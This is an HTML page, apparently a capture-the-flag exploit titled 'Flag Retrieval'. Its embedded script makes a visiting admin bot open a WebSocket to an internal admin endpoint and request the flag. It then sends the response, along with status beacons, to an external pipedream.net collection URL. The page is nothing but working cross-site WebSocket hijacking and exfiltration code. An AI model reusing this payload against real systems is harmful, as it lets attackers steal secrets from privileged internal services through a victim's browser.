<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Flag Retrieval</title>
</head>
<body>
    <script>
        fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: "Bot accessed HTML page" })
        });

        const ws = new WebSocket('ws://web:8080/admin/ws');


   ws.onopen = () => {
       fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: "Opened?" })
        });
     console.log('WebSocket connection established!');
     ws.send('flag');
   };

   ws.onmessage = (event) => {
     const flag = event.data;
     console.log("Flag:", flag);

     fetch('https://eohjvz10k1h17dr.m.pipedream.net/', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ flag: flag })
     });
   };
    </script>
</body>
</html>
